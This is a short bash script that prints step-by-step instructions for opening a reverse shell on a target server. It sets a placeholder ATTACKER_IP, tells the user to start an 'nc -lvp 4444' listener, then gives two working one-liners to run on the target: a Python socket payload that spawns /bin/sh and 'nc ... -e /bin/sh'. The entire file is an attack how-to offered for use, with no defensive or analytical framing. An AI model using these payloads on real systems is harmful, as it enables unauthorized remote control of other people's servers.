#!/bin/bash

ATTACKER_IP='1.2.3.4'

echo "Replace ${ATTACKER_IP} with an IP you control, and can allow inbound access to on port 4444"
echo ""
echo "On the IP you control, establish a listening ncat server by typing:"
echo "nc -lvp 4444"
echo ""
echo "On the target server, here are two example of ways to start a reverse shell.  Run either of these to establish your remote shell (be sure to replace ${ATTACKER_IP} with an IP you control)"
echo ""
echo "Example 1: python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${ATTACKER_IP}',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\""
echo ""
echo "Example 2: nc \"${ATTACKER_IP}\" 4444 -e /bin/sh"